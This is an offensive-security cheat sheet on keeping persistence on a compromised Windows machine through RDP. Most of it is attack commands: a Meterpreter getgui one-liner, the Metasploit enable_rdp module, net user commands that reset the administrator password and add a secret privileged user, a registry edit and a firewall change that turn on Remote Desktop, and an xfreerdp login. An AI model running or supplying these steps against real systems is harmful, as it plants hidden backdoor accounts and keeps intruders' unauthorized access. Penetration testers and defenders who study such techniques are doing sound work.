# Establishing Windows Persistence via RDP

One other way to ensure persistence is to  create a secret user on the target with administrative privileges and the Enable RDP service on the target such that even if the system is shut down or anything cut off our initial session, in this case we can use the RDP session to connect the target.
<br>
Persistence via RDP involves:
1. Creating an new User
2. Enabling RDP on the target
3. Hide User from windows Login screen

#### USING METERPRETER SHELL:
We can do all these things with a single line command using Meterpreter,

```c
meterpreter > run getgui -e -u [USERNAME] -p [PASSWORD]
```

#### MANUAL METHOD:
In manual method we need to do all these one by one. 
First we can Enable RDP on target:

```c
use post/windows/manage/enable_rdp
set ENABLE true
set LPORT [PORT_TO_FORWARD]
set SESSION [SESSION_ID]
exploit
```

Then we should create a new user:

```c
C:\> net user administrator [NEW_PASSWORD]
# if you have the privs you can change a password directly. if by any reason you cant change a user's password, try to create a new user

C:\> net user [USER] [PASSWORD] /ADD
C:\> net localgroup [GROUPNAME] [USERNAME] /ADD
```

Now finally we can connect to the target using RDP

```c
$ xfreerdp /u:[USER] /p:[PASSWORD] /v:[TARGET]
```


#### MANUAL METHOD FOR ENABLING RDP:

```c
C:\> reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

C:\> netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
